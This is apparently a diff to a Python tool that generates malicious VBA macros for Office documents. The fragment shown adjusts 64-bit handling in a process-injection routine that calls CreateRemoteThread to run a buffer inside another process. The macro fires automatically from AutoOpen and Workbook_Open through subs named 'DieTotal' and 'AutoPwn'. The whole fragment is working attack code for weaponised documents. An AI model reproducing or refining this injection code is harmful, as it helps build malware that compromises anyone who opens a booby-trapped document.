@@ -467,6 +467,7 @@ lines1 +=  ["Dim vFile As Variant\r\n",
 "Dim b64 As Boolean\r\n",
 "b64 = False\r\n",
 "b64 = IsWow64(hProcess)\r\n",
+"inject64 = %s\r\n" % str(args.inject64),
 "If b64 = True Then\r\n",
 "If inject64 = True Then\r\n",
 "If hProcess = 0 Then\r\n",
@@ -514,7 +515,8 @@ lines1 += ["For myCount = LBound(buf) To UBound(buf)\r\n",
  
 
 lines1 += ["hThread = CreateRemoteThread(hProcess, 0&, 0&, ByVal lLinkToLibrary, 0, 0, ByVal 0&)\r\n",
-"If hThread = 0 Then\r\n",
+"End If\r\n",
+"If hThread = 0 or Inject64 = False Then\r\n",
 "If lLinkToLibrary <> 0 Then\r\n",
 "VirtualFreeEx hProcess, lLinkToLibrary, 0, MEM_RELEASE\r\n",
 "End If\r\n",
@@ -525,7 +527,6 @@ lines1 += ["hThread = CreateRemoteThread(hProcess, 0&, 0&, ByVal lLinkToLibrary,
 "Inject = 1 'Success\r\n",
 "End If\r\n",
 
-"End If\r\n",
 "Else\r\n",
 "If hProcess = 0 Then\r\n",
 "Exit Function\r\n",
@@ -633,7 +634,6 @@ lines1 += ["hThread = CreateRemoteThread(hProcess, 0&, 0&, ByVal lLinkToLibrary,
 "Sub AutoOpen()\r\n",
 
 #Inject64
-"inject64 = %s\r\n" % str(args.inject64),
 
 "DieTotal\r\n",
 "AutoPwn\r\n",
@@ -641,7 +641,6 @@ lines1 += ["hThread = CreateRemoteThread(hProcess, 0&, 0&, ByVal lLinkToLibrary,
 "Sub Workbook_Open()\r\n",
 
 #Inject64
-"inject64 = %s\r\n" % str(args.inject64),
 "DieTotal\r\n",
 "AutoPwn\r\n",
 "End Sub\r\n"]
